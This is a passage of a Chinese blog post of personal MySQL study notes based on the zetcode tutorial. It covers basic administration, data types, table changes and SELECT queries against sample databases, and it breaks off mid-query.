                    <span itemprop="name">SQL</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/sql/2014/05/31/mysql-learning-notes/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="sql/2014/05/31/mysql-learning-notes/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>随便看看，来自<a href="http://zetcode.com" target="_blank" rel="external">http://zetcode.com</a>的教程笔记。放到一个文档里便于通过<code>Ctrl+F</code>快速查找。</p>
<h2 id="安装">安装</h2><p>从软件源安装基本是一键安装。</p>
<p>源码安装参见<a href="http://zetcode.com/databases/mysqltutorial/installation" target="_blank" rel="external">MySQL installation</a></p>
<h2 id="初步">初步</h2><p>启动和停止服务，反正gentoo下是</p>
<pre><code>sudo /etc/init.d/mysqld <span class="operator"><span class="keyword">start</span>
sudo /etc/init.<span class="keyword">d</span>/mysqld <span class="keyword">stop</span>
sudo /etc/init.<span class="keyword">d</span>/mysqld restart</span>
</code></pre><p>手动启动<code>mysqld_safe &amp;</code>也行。</p>
<p>检查服务是否启动：</p>
<pre><code> <span class="regexp">~/Work/</span>learn/MySQL ⮀ mysqladmin -uroot -p ping
Enter <span class="string">password:</span> 
mysqld is alive
</code></pre><p><code>mysqladmin</code>还可以用来关闭服务，参见<code>man mysqladmin</code>.</p>
<p><code>mysql -uroot -p</code>直接连接到mysql的交互shell中去。</p>
<p>在这个shell中可以使用命令(比如<code>system pwd</code>)也可以使用SQL语句，SQL语句以分号结束。</p>
<p>查看数据库:</p>
<pre><code><span class="operator"><span class="keyword">SHOW</span> <span class="keyword">DATABASES</span>;</span>
</code></pre><p>创建数据库<code>mydb</code></p>
<pre><code>CREAT DATABASE mydb<span class="comment">;</span>
</code></pre><p>使用数据库<code>mydb</code></p>
<pre><code><span class="keyword">use</span> <span class="title">mydb</span>;
</code></pre><p>显示数据库中的表：</p>
<pre><code><span class="operator"><span class="keyword">SHOW</span> <span class="keyword">TABLES</span>;</span>
</code></pre><p>执行数据库文件：</p>
<pre><code><span class="built_in">source</span> cars.sql
</code></pre><p>从表中选择：</p>
<pre><code><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars;</span>
</code></pre><p>创建新用户</p>
<pre><code><span class="operator"><span class="keyword">CREATE</span> <span class="keyword">USER</span> user123@localhost <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'pass123'</span>;</span>
</code></pre><p>授予用户对特定数据库/表的特定权限</p>
<pre><code><span class="operator"><span class="keyword">GRANT</span> ALL <span class="keyword">ON</span> mydb.* <span class="keyword">to</span> user123@localhost;</span>
</code></pre><h2 id="快速教程">快速教程</h2><p>root用户：</p>
<ul>
<li>创建数据库</li>
<li>使用数据库</li>
<li>导入数据库文件(吐槽下mysql数据库导入的神慢)</li>
<li>授予权限</li>
</ul>
<p>普通用户：</p>
<ul>
<li>查看数据库</li>
<li>使用数据库</li>
<li>查看表</li>
</ul>
<p>描述表：</p>
<pre><code><span class="operator"><span class="keyword">DESCRIBE</span> City;</span>
</code></pre><p>查看创建表的命令</p>
<pre><code><span class="operator"><span class="keyword">SHOW</span> CREAT <span class="keyword">TABLE</span> City;</span>
</code></pre><p>使用<code>mysqldump</code>备份表(在系统shell中而不是mysql的交互shell)</p>
<pre><code>mysqldump -uroot -<span class="tag">p</span> world City &gt; city.sql
</code></pre><p>移除表</p>
<pre><code><span class="operator"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> City;</span>
</code></pre><p>接着讲讲查表。</p>
<p>限制条数：</p>
<pre><code><span class="operator"><span class="keyword">SELECT</span> <span class="keyword">Id</span>, <span class="keyword">Name</span>, Population <span class="keyword">FROM</span> City <span class="keyword">LIMIT</span> <span class="number">10</span>;</span>
<span class="operator"><span class="keyword">SELECT</span> <span class="keyword">Id</span>, <span class="keyword">Name</span>, Population <span class="keyword">FROM</span> City <span class="keyword">LIMIT</span> <span class="number">15</span>, <span class="number">5</span>;</span>
</code></pre><p>使用<code>less</code>分页，</p>
<pre><code>pager <span class="operator">less</span>
</code></pre><p>非交互式使用SQL命令</p>
<pre><code>mysql -<span class="keyword">u</span> user123 -p world -<span class="keyword">e</span> <span class="string">"SELECT * FROM City"</span> &gt; city
</code></pre><p>COUNT函数</p>
<pre><code><span class="operator"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(<span class="keyword">Id</span>) <span class="keyword">AS</span> <span class="string">'Number of rows'</span> <span class="keyword">FROM</span> City;</span>
</code></pre><p>MAX, 下面命令显示了SQL的子查询特性:</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Population <span class="keyword">FROM</span> City
    -&gt; WHERE Population = (<span class="built_in">SELECT</span> <span class="built_in">Max</span>(Population) <span class="keyword">FROM</span> City);
</code></pre><p>MIN:</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Population <span class="keyword">FROM</span> City
    -&gt; WHERE Population = (<span class="built_in">SELECT</span> <span class="built_in">Min</span>(Population) <span class="keyword">FROM</span> City);
</code></pre><p>WHERE语句</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Population <span class="keyword">FROM</span> City 
    -&gt; <span class="keyword">WHERE</span> Population &gt; <span class="number">1000000</span>;

mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> City <span class="keyword">WHERE</span> Name <span class="keyword">LIKE</span> <span class="comment">'Kal%';</span>

mysql&gt; <span class="keyword">SELECT</span> Name, Population <span class="keyword">FROM</span> City 
    -&gt; <span class="keyword">WHERE</span> ID <span class="keyword">IN</span> (<span class="number">5</span>, <span class="number">32</span>, <span class="number">344</span>, <span class="number">554</span>);

mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> City <span class="keyword">WHERE</span> Name = <span class="comment">'Bratislava';</span>

mysql&gt; <span class="keyword">SELECT</span> Name, Population <span class="keyword">FROM</span> City 
    -&gt; <span class="keyword">WHERE</span> Population BETWEEN <span class="number">670000</span> <span class="keyword">AND</span> <span class="number">700000</span>;
</code></pre><p>排序数据</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Population FROM City
    <span class="subst">-&gt; </span><span class="keyword">ORDER</span> <span class="keyword">BY</span> Population DESC LIMIT <span class="number">10</span>;

mysql&gt; <span class="keyword">SELECT</span> Name, Population FROM City 
    <span class="subst">-&gt; </span><span class="keyword">ORDER</span> <span class="keyword">BY</span> Population ASC LIMIT <span class="number">10</span>;

mysql&gt; <span class="keyword">SELECT</span> Name, Population FROM City 
    <span class="subst">-&gt; </span><span class="keyword">ORDER</span> <span class="keyword">BY</span> Name LIMIT <span class="number">10</span>;
</code></pre><p>聚合数据</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> District, <span class="keyword">SUM</span>(Population) FROM City
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> District = <span class="string">'Henan'</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> District;

mysql&gt; <span class="keyword">SELECT</span> Name, District, Population FROM City
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> District = <span class="string">'Henan'</span>;

mysql&gt; <span class="keyword">SELECT</span> District, <span class="keyword">SUM</span>(Population) FROM City
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> CountryCode = <span class="string">'USA'</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> District
    <span class="subst">-&gt; </span>HAVING <span class="keyword">SUM</span>(Population) &gt; <span class="number">3000000</span>;
</code></pre><p>更新，删除和插入数据</p>
<pre><code>mysql&gt; UPDATE Country <span class="built_in">SET</span> HeadOfState = <span class="string">'Xi Jinping'</span> 
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> Name = <span class="string">'China'</span>;

mysql&gt; DELETE FROM City <span class="keyword">WHERE</span> ID <span class="keyword">IN</span> (<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>);

mysql&gt; TRUNCATE TABLE City;

mysql&gt; INSERT <span class="keyword">INTO</span> City VALUES(<span class="number">999999</span>, <span class="string">'Kabul'</span>, <span class="string">'AFG'</span>, <span class="string">'Kabol'</span>, <span class="number">1780000</span>);

mysql&gt; DROP TABLE City
</code></pre><h2 id="MySQL存储引擎">MySQL存储引擎</h2><p>存储引擎是数据库管理系统读写更新数据库中数据的软件模型。</p>
<p>MySQL支持的存储引擎有：</p>
<ul>
<li>MyISAM，早于5.5版本的默认引擎</li>
<li>InnoDB</li>
<li>Memory</li>
<li>CSV</li>
<li>等等</li>
</ul>
<p>情况很复杂，选择之前最好上<a href="http://stackoverflow.com/" target="_blank" rel="external">StackOverFlow</a>问问。</p>
<p>创建表时使用<code>ENGINE</code>关键字指定引擎：</p>
<pre><code>mysql&gt; CREATE TABLE Cars(Id <span class="built_in">INTEGER</span> PRIMARY KEY, Name VARCHAR(<span class="number">50</span>), 
    <span class="subst">-&gt; </span>Cost <span class="built_in">INTEGER</span>) ENGINE=<span class="string">'MyISAM'</span>;
</code></pre><p>查看当前引擎：</p>
<pre><code>mysql&gt; SHOW <span class="section"><span class="keyword">VARIABLES</span> LIKE 'storage_engine';</span>
</code></pre><p>发现特定数据库的表引擎</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> ENGINE FROM information_schema<span class="built_in">.</span>TABLES
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'mydb'</span>
    <span class="subst">-&gt; </span><span class="subst">AND</span> TABLE_NAME=<span class="string">'Cars'</span>;
</code></pre><p>更改表的引擎：</p>
<pre><code>mysql&gt; ALTER <span class="keyword">TABLE</span> Cars ENGINE=<span class="string">'InnoDB'</span>;
</code></pre><h2 id="MySQL数据类型">MySQL数据类型</h2><h3 id="数值">数值</h3><p>整数：</p>
<table>
<thead>
<tr>
<th>Data type</th>
<th>Bytes</th>
<th>Minimum value</th>
<th>Maximum value</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYINT</td>
<td>1</td>
<td>-128</td>
<td>127</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>2</td>
<td>-32768</td>
<td>32767</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td>3</td>
<td>-8388608</td>
<td>8388607</td>
</tr>
<tr>
<td>INTEGER</td>
<td>4</td>
<td>-2147483648</td>
<td>2147483647</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8</td>
<td>-9223372036854775808</td>
<td>9223372036854775807</td>
</tr>
</tbody>
</table>
<p>浮点：</p>
<table>
<thead>
<tr>
<th>Data type</th>
<th>Bytes</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLOAT</td>
<td>4</td>
</tr>
<tr>
<td>DOUBLE</td>
<td>8</td>
</tr>
<tr>
<td>DECIML</td>
<td>(M位，小数点后D位)</td>
</tr>
</tbody>
</table>
<p>定义表时指定：</p>
<pre><code>mysql&gt; CREATE TABLE Numbers <span class="list">(<span class="keyword">Id</span> TINYINT, Floats FLOAT, Decimals DECIMAL<span class="list">(<span class="number">3</span>, <span class="number">2</span>)</span>)</span><span class="comment">;</span>
</code></pre><p>更改列字段内型：</p>
<pre><code>mysql&gt; ALTER TABLE Ages MODIFY Age TINYINT UNSIGNED<span class="comment">;</span>
</code></pre><p>插入值</p>
<pre><code><span class="tag">mysql</span>&gt; <span class="tag">INSERT</span> <span class="tag">INTO</span> <span class="tag">Numbers</span> <span class="tag">VALUES</span> (1, 1<span class="class">.1</span>, 1<span class="class">.1</span>), (2, 1<span class="class">.1</span>, 1<span class="class">.1</span>), (3, 1<span class="class">.1</span>, 1<span class="class">.1</span>);
</code></pre><p>DECIMAL类型更加精确，FLOAT和DOUBLE都只是近似。</p>
<h3 id="日期和时间">日期和时间</h3><p>有这么几种：</p>
<table>
<thead>
<tr>
<th>Data type</th>
<th>范围</th>
<th>显示格式</th>
</tr>
</thead>
<tbody>
<tr>
<td>DATE</td>
<td>‘1000-01-01’ 到 ‘9999-12-31’.</td>
<td>YYYY-MM-DD</td>
</tr>
<tr>
<td>TIME</td>
<td>‘-838:59:59’ to ‘838:59:59’.</td>
<td>HH:MM:SS</td>
</tr>
<tr>
<td>DATETIME</td>
<td>‘1000-01-01 00:00:00’ to ‘9999-12-31 23:59:59’.</td>
<td>YYYY-MM-DD HH:MM:SS</td>
</tr>
<tr>
<td>YEAR</td>
<td>1901 to 2155</td>
<td>YYYY</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>‘1970-01-01 00:00:01’ UTC to ‘2038-01-19 03:14:07’ UTC</td>
<td>见下表</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>Data type</th>
<th>Format</th>
</tr>
</thead>
<tbody>
<tr>
<td>TIMESTAMP(14)</td>
<td>YYYYMMDDHHMMSS</td>
</tr>
<tr>
<td>TIMESTAMP(12)</td>
<td>YYMMDDHHMMSS</td>
</tr>
<tr>
<td>TIMESTAMP(10)</td>
<td>YYMMDDHHMM</td>
</tr>
<tr>
<td>TIMESTAMP(8)</td>
<td>YYYYMMDD</td>
</tr>
<tr>
<td>TIMESTAMP(6)</td>
<td>YYMMDD</td>
</tr>
<tr>
<td>TIMESTAMP(4)</td>
<td>YYMM</td>
</tr>
<tr>
<td>TIMESTAMP(2)</td>
<td>YY</td>
</tr>
</tbody>
</table>
<p>DATE、DATETIME和DATE输入时可支持多种格式，分隔符可以任意，超出范围截断到0.</p>
<pre><code>mysql&gt; CREATE <span class="function">TABLE <span class="title">Dates</span><span class="params">(Id TINYINT, Dates DATE)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">1</span>, <span class="string">'2011-01-24'</span>)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">2</span>, <span class="string">'2011/01/25'</span>)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">3</span>, <span class="string">'20110126'</span>)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">4</span>, <span class="string">'110127'</span>)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">5</span>, <span class="string">'2011+01+28'</span>)</span></span>;
</code></pre><p><code>TIMEDIFF</code>计算时差：</p>
<pre><code>mysql&gt; <span class="function">SELECT <span class="title">TIMEDIFF</span><span class="params">(<span class="string">'23:34:32'</span>, <span class="string">'22:00:00'</span>)</span></span>;
</code></pre><p><code>TIME</code>函数提取时间部分</p>
<pre><code>mysql&gt; <span class="function">SELECT <span class="title">TIME</span><span class="params">(<span class="string">'2011-01-29 11:27:42'</span>)</span></span>;
</code></pre><p><code>DAYNAME</code>函数提取星期名。</p>
<pre><code>mysql&gt; SELECT DAYNAME('<span class="number">2011</span><span class="number">@01</span><span class="number">@29</span> <span class="number">11</span><span class="number">@50</span><span class="number">@13</span>');
</code></pre><p>MySQL自动填充TIMESTAMP列，记录<code>INSERT</code>和<code>UPDATE</code>时间。</p>
<h3 id="字符串">字符串</h3><table>
<thead>
<tr>
<th>Data type</th>
<th>Format</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>CHAR</td>
<td>CHAR(x),x=0:255</td>
<td>定长字符串存储</td>
</tr>
<tr>
<td>VARCHAR</td>
<td>VARCHAR(x),x=0:65535</td>
<td>变长字符串数据存储</td>
</tr>
<tr>
<td>BINARY</td>
<td>BINARY(x),x=0:255</td>
<td>定长字节存储</td>
</tr>
<tr>
<td>VARBINARY</td>
<td>VARBINARY(x),x=0:65535</td>
<td>变长字节存储</td>
</tr>
<tr>
<td>TINYBLOB</td>
<td>0-255</td>
<td>BLOB存储大二进制对象</td>
</tr>
<tr>
<td>BLOB</td>
<td>0-65535</td>
<td></td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>0 - 16777215</td>
<td></td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>0 - 4294967295</td>
<td></td>
</tr>
<tr>
<td>TINYTEXT</td>
<td>0-255</td>
<td>TEXT存储大文本数据</td>
</tr>
<tr>
<td>TEXT</td>
<td>0-65535</td>
<td></td>
</tr>
<tr>
<td>MEDIUMTEXT</td>
<td>0 - 16777215</td>
<td></td>
</tr>
<tr>
<td>LONGTEXT</td>
<td>0 - 4294967295</td>
</tr>
</tbody>
</table>
<p><code>ENUM</code>创建一个只能插入列表中特定值的表</p>
<pre><code>mysql&gt; CREATE TABLE SizeTable<span class="list">(<span class="keyword">Size</span> ENUM<span class="list">(<span class="quoted">'S</span>', <span class="quoted">'M</span>', <span class="quoted">'L</span>', <span class="quoted">'XL</span>', <span class="quoted">'XXL</span>')</span>)</span><span class="comment">;</span>
</code></pre><p><code>SET</code>类似于<code>ENUM</code>，但可以包含0个或多个列表中的值。</p>
<h2 id="创建、更改和删除表">创建、更改和删除表</h2><h3 id="创建指令">创建指令</h3><p>创建一个表，指定表名、列的名称和类型：</p>
<pre><code>mysql&gt; CREATE <span class="keyword">TABLE</span> Testing(Id <span class="keyword">INTEGER</span>);
</code></pre><p>查看某个表的建表语句</p>
<pre><code>mysql&gt; SHOW CREATE TABLE Testing<span class="comment">;</span>
</code></pre><p>创建的，非临时表可以通过<code>SHOW TABLES</code>语法查看：</p>
<pre><code>mysql&gt; SHOW TABLES <span class="keyword">LIKE</span> <span class="comment">'T%';</span>
</code></pre><h2 id="删除表">删除表</h2><p>删除表：</p>
<pre><code>mysql&gt; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> Testing;
</code></pre><h2 id="更改表">更改表</h2><p>使用<code>ALTER TABLE</code>语法更改表。以下为重命名表、添加列、添加主键、更改列、删除列操作。(DESCRIBE和SHOW COLUMNS FROM同义，INTEGER和INT相同)</p>
<pre><code>mysql&gt; ALTER <span class="keyword">TABLE</span> Testing <span class="keyword">RENAME</span> TO TestTable;
mysql&gt; ALTER <span class="keyword">TABLE</span> TestTable ADD iValues INT;
mysql&gt; ALTER <span class="keyword">TABLE</span> TestTable ADD PRIMARY KEY (Id);
mysql&gt; ALTER <span class="keyword">TABLE</span> TestTable CHANGE COLUMN iValues iValues1 INT;
mysql&gt; ALTER <span class="keyword">TABLE</span> TestTable <span class="keyword">DROP</span> COLUMN iValues1;
</code></pre><h2 id="MySQL表达式">MySQL表达式</h2><h3 id="字面常量">字面常量</h3><pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="number">3</span>, <span class="string">'Wolf'</span>, <span class="number">34.5</span>, <span class="number">0x34</span>, <span class="number">0</span>+b<span class="string">'10111'</span><span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> <span class="literal">NULL</span>, \N<span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> <span class="literal">TRUE</span>, <span class="literal">FALSE</span><span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> <span class="string">'2011-01-11'</span>, <span class="string">'23:33:01'</span>, <span class="string">'98/11/31/ 14:22:20'</span><span class="comment">;</span>
</code></pre><h3 id="变量">变量</h3><pre><code>mysql&gt; SET <span class="constant">@name</span> = <span class="string">'Jane'</span><span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> <span class="constant">@name</span><span class="comment">;</span>
</code></pre><h3 id="运算符">运算符</h3><p>包括一元的</p>
<pre><code>mysql&gt; <span class="function">SELECT <span class="title">NOT</span> <span class="params">(<span class="number">3</span>&gt;<span class="number">9</span>)</span></span>;
</code></pre><p>算术的：</p>
<pre><code>mysql&gt; SELECT <span class="number">9</span>/<span class="number">2</span>, <span class="number">9</span> DIV <span class="number">2</span>;
</code></pre><p>逻辑的：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="literal">FALSE</span> <span class="keyword">XOR</span> <span class="literal">FALSE</span>, <span class="literal">FALSE</span> <span class="keyword">XOR</span> <span class="literal">TRUE</span>,
-&gt; <span class="literal">TRUE</span> <span class="keyword">XOR</span> <span class="literal">FALSE</span>, <span class="literal">TRUE</span> <span class="keyword">XOR</span> <span class="literal">TRUE</span>;
</code></pre><p>关系的：</p>
<pre><code>mysql&gt; SELECT <span class="number">3</span> * <span class="number">3</span> = <span class="number">9</span>, <span class="number">9</span> = <span class="number">9</span>, <span class="number">3</span> &lt; <span class="number">4</span>, <span class="number">3</span> &lt;&gt; <span class="number">5</span>, <span class="number">4</span> &lt;= <span class="number">4</span>, <span class="number">5</span> != <span class="number">5</span>;
</code></pre><p>位的：</p>
<pre><code>mysql&gt; SELECT <span class="number">6</span> | <span class="number">3</span>, <span class="number">6</span> &amp; <span class="number">3</span>, <span class="number">6</span> &lt;&lt; <span class="number">1</span>;
</code></pre><p>其它：</p>
<pre><code>mysql&gt; <span class="keyword">SET</span> @running = <span class="keyword">FALSE</span>;
mysql&gt; <span class="keyword">SELECT</span> @running <span class="keyword">IS</span> <span class="keyword">FALSE</span>;
mysql&gt; <span class="keyword">SELECT</span> <span class="string">'Tom'</span> <span class="keyword">IN</span> (<span class="string">'Tom'</span>, <span class="string">'Frank'</span>, <span class="string">'Jane'</span>);
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">Where</span> Name <span class="keyword">IN</span> (<span class="string">'Audi'</span>, <span class="string">'Hummer'</span>);
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Name LIKE <span class="string">'Vol%'</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Name LIKE <span class="string">'____'</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Name REGEXP <span class="string">'e.$'</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Name REGEXP <span class="string">'^.e.*e.$'</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Cost BETWEEN <span class="number">20000</span> <span class="keyword">AND</span> <span class="number">55000</span>;
</code></pre><h3 id="优先级">优先级</h3><p>加个括号吧</p>
<p>同级运算符从左到右执行</p>
<h2 id="插入、更新和删除数据">插入、更新和删除数据</h2><h2 id="插入">插入</h2><p>插入时可以指定插入的列，也可以不指定</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> Books(Id, Title, Auth<span class="subst">or</span>) VALUES(<span class="number">1</span>, <span class="string">'War and Peace'</span>, 
<span class="subst">-&gt; </span><span class="string">'Leo Tolstoy'</span>);
mysql&gt; INSERT <span class="keyword">INTO</span> Books VALUES(<span class="number">3</span>, <span class="string">'Crime and Punishment'</span>,
<span class="subst">-&gt; </span><span class="string">'Fyodor Dostoyevsky'</span>);
</code></pre><p>若不指定<code>Id</code>也可。</p>
<pre><code>mysql&gt; INSERT INTO Books<span class="list">(<span class="keyword">Title</span>, Author)</span> VALUES <span class="list">(<span class="quoted">'The</span> Brothers Karamazov',
-&gt; <span class="quoted">'Fyodor</span> Dostoyevsky')</span><span class="comment">;</span>
</code></pre><p>一次可以插入单个或多个值</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> Books(Title, Auth<span class="subst">or</span>) VALUES (<span class="string">'The Insulted and Humiliated'</span>,
<span class="subst">-&gt; </span><span class="string">'Fyodor Dostoyevsky'</span>), (<span class="string">'Cousin Bette'</span>, <span class="string">'Honore de Balzac'</span>);
</code></pre><p><code>REPLACE</code>可以取代特定行：</p>
<pre><code>mysql&gt; REPLACE INTO <span class="function">Books <span class="title">VALUES</span><span class="params">(<span class="number">3</span>, <span class="string">'Paradise Lost'</span>, <span class="string">'John Milton'</span>)</span></span>;
</code></pre><p>插入也可以和<code>SELECT</code>结合：</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> Books2 <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Books;
</code></pre><p>可以使用<code>LOAD DATA INFILE</code>和<code>LOAD XML INFILE</code>语法从文件插入：</p>
<pre><code>mysql&gt; LOAD <span class="built_in">DATA</span> INFILE <span class="string">'/tmp/books.csv'</span>    
    <span class="subst">-&gt; </span><span class="keyword">INTO</span> TABLE Books    
    <span class="subst">-&gt; </span>FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">','</span>    
    <span class="subst">-&gt; </span>LINES TERMINATED <span class="keyword">BY</span> <span class="string">'\n'</span>;

mysql&gt; LOAD <span class="built_in">XML</span> INFILE <span class="string">'/home/vronskij/programming/mysql/books.xml'</span> <span class="keyword">INTO</span> TABLE Books;
</code></pre><h3 id="删除">删除</h3><p>从表中删除：</p>
<pre><code>mysql&gt; <span class="keyword">DELETE</span> <span class="keyword">FROM</span> Books2 WHERE Id=<span class="number">1</span>;
mysql&gt; <span class="keyword">DELETE</span> <span class="keyword">FROM</span> Books2;
mysql&gt; TRUNCATE Books2;
</code></pre><h3 id="更新">更新</h3><p><code>UPDATE</code>用于变更选中行的列值。</p>
<p>mysql&gt; UPDATE Books SET Author=’Lev Nikolayevich Tolstoy’<br>    -&gt; WHERE Id=1;</p>
<h2 id="SELECT语句">SELECT语句</h2><h3 id="获取数据">获取数据</h3><p>选择所有内容</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars;
</code></pre><p>选择特定的列</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Cost <span class="keyword">FROM</span> Cars;
</code></pre><p>可以重命名列名：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Cost <span class="keyword">AS</span> Price <span class="keyword">FROM</span> Cars;
</code></pre><p>限制输出个数：</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> * <span class="keyword">FROM</span> Cars LIMIT <span class="number">4</span>;
mysql&gt; <span class="built_in">SELECT</span> * <span class="keyword">FROM</span> Cars LIMIT <span class="number">2</span>, <span class="number">4</span>;
mysql&gt; <span class="built_in">SELECT</span> * <span class="keyword">FROM</span> Cars LIMIT <span class="number">4</span> OFFSET <span class="number">2</span>;  <span class="preprocessor"># 同上</span>
</code></pre><h3 id="排序数据">排序数据</h3><p>以降序(<code>DESC</code>)或升序(<code>ASC</code>)排序：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Cost <span class="keyword">FROM</span> Cars <span class="keyword">ORDER</span> <span class="keyword">BY</span> Cost <span class="keyword">DESC</span>;
</code></pre><h3 id="WHERE">WHERE</h3><p>WHERE语句就像个过滤器：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> Customer=<span class="string">"Smith"</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> Customer <span class="keyword">LIKE</span> <span class="string">"B%"</span>;
</code></pre><h3 id="移除重复项">移除重复项</h3><p><code>DISTINCT</code>从结果中选择唯一的结果集。</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Customer <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> Customer <span class="keyword">LIKE</span> <span class="comment">'B%';</span>
</code></pre><p><code>COUNT</code>函数统计个数</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> COUNT(Customer) <span class="keyword">AS</span> <span class="string">"Orders by Brown"</span> <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> Customer=<span class="string">"Brown"</span>;
</code></pre><h2 id="聚合数据">聚合数据</h2><p><code>GROUP BY</code>语句被用来结合值一样的数据库记录到一个单一的记录中。通常和聚合函数一起使用。</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> SUM(OrderPrice) <span class="keyword">AS</span> Total, Customer <span class="keyword">FROM</span> Orders <span class="keyword">GROUP</span> <span class="keyword">BY</span> Customer;
</code></pre><p>使用聚合函数时不能使用<code>WHERE</code>而是使用<code>HAVING</code>：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="keyword">SUM</span>(OrderPrice) AS Total, Customer FROM Orders
    <span class="subst">-&gt; </span><span class="keyword">GROUP</span> <span class="keyword">BY</span> Customer HAVING <span class="keyword">SUM</span>(OrderPrice)&gt;<span class="number">1000</span>;
</code></pre><h3 id="选择内容到文件">选择内容到文件</h3><p><code>SELECT</code>语句能被用来写入表到文件中：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">INTO</span> OUTFILE <span class="string">'/tmp/cars.txt'</span>
    <span class="subst">-&gt; </span>FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">','</span>
    <span class="subst">-&gt; </span>LINES TERMINATED <span class="keyword">BY</span> <span class="string">'\n'</span>
    <span class="subst">-&gt; </span>FROM Cars;
</code></pre><h2 id="子查询">子查询</h2><p>又称嵌套查询，可以和<code>INSERT</code>、<code>SELECT</code>、<code>UPDATE</code>和<code>DELETE</code>配合使用：</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> Cars2 <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars;
mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Customers <span class="keyword">WHERE</span> 
-&gt; CustomerId=(<span class="keyword">SELECT</span> CustomerId <span class="keyword">FROM</span> Reservations <span class="keyword">WHERE</span> Id=<span class="number">5</span>);
mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Customers <span class="keyword">WHERE</span> CustomerId <span class="keyword">IN</span>    
